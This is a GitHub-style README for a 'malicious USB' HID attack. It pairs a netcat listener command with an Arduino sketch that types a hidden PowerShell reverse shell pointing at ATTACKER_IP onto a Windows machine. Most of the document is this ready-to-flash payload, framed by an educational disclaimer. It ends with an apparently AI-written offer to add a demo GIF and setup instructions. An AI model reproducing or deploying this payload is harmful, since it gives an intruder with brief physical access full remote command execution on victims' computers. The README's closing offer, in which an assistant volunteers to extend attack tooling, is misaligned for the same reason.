# 🛠️ Malicious USB Reverse Shell (Windows → Linux)

This project demonstrates a malicious USB device capable of establishing a **reverse shell** on a Windows machine by emulating keyboard input (HID attack). It uses **PowerShell** and **Netcat** for remote command execution and control from a Linux listener.

> ⚠️ **WARNING**: This project is intended **strictly for educational and authorized penetration testing purposes**. Unauthorized use on systems you do not own is **illegal and unethical**.

---

## 📚 Table of Contents

- [Features](#-features)
- [Linux Listener Setup](#️-linux-listener-setup)
- [Arduino HID Payload](#️-arduino-hid-payload-eg-arduino-leonardo-digispark-malduino)
- [Result](#-result)
- [Disclaimer](#-disclaimer)
- [Related Topics](#-related-topics)
- [Ethical Use Only](#-ethical-use-only)

---

## 📌 Features

- USB device emulates a keyboard on plug-in.
- Automatically opens PowerShell.
- Executes a reverse shell to a specified Linux attacker IP.
- Linux listener gains full shell access to the compromised Windows system.
- Tested across multiple Windows environments for reliability.

---

## 🖥️ Linux Listener Setup

On your attack machine (Kali, Parrot, etc.), run:

```bash
nc -lvnp 4444
```
## ⚙️ Arduino HID Payload (e.g., Arduino Leonardo, Digispark, MalDuino)

- Flash the following sketch to your HID-capable device:

```cpp
#include "Keyboard.h"

void setup() {
  delay(3000);  // Wait for OS to detect the device

  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  // Open PowerShell
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // PowerShell reverse shell payload
  Keyboard.print("powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // Nothing
}
```
✅ Replace ATTACKER_IP with your Linux attack box IP address.

## 🧪 Result
- When the USB is plugged into a Windows machine:

- The system recognizes it as a keyboard.

- It opens PowerShell silently.

- It connects to the attacker's listener.

- A reverse shell is established.

## 🧼 Disclaimer

This project is for educational and research purposes only.


## ❌ Never deploy this payload on unauthorized systems.

✅ Always have explicit consent when testing on real environments.

## 📚 Related Topics

- HID Attacks

- Rubber Ducky / MalDuino / Digispark

- Windows PowerShell Reverse Shells

- Netcat Listener

- Red Team Tactics

## 🔒 Ethical Use Only
Use responsibly. Learn legally.
```markdown
Let me know if you'd like:
- A GIF or image showing the attack in action
- Instructions for setting up Arduino IDE for Digispark or Leonardo
- A separate `.ino` file export
```
